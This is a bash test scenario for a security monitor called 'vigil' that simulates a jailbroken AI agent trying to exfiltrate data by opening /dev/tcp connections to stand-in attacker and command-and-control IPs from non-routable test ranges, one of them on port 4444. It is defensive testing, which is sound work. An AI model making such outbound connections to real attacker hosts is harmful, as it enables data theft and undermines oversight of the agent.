#!/bin/bash
# Scenario: network exfiltration
# Simulates a jailbroken AI agent attempting to send data to an attacker-controlled server.
# Expected: vigil detects the connection and logs a BLOCK event (for denied IPs via BlockIP).
#
# Note: vigil's current MVP uses a default-allow network policy with explicit IP blocking.
# This scenario demonstrates the audit trail — every outbound connection is logged.

set -uo pipefail

# Known-bad IPs that would be in vigil's block list
ATTACKER_IP="203.0.113.99"   # TEST-NET-3 (RFC 5737) — safe for demo, not routable
C2_IP="192.0.2.1"            # TEST-NET-1 — safe for demo

echo "=== Scenario: Network Exfiltration ==="
echo "Attempting outbound connections to attacker-controlled servers..."
echo ""

try_connect() {
  local ip="$1"
  local port="${2:-443}"
  echo -n "  Connecting to $ip:$port ... "
  if timeout 2 bash -c "echo > /dev/tcp/$ip/$port" 2>/dev/null; then
    echo "CONNECTED (connection logged by vigil)"
  else
    echo "BLOCKED or unreachable (vigil logged the attempt)"
  fi
}

# These IPs are in RFC 5737 test ranges — not routable, safe for demo
try_connect "$ATTACKER_IP" 443
try_connect "$C2_IP" 4444

echo ""
echo "All connection attempts are captured in vigil's audit log."
echo "In production, vigil.BlockIP() adds discovered C2 IPs to the kernel block map,"
echo "causing subsequent connections to return EPERM synchronously."
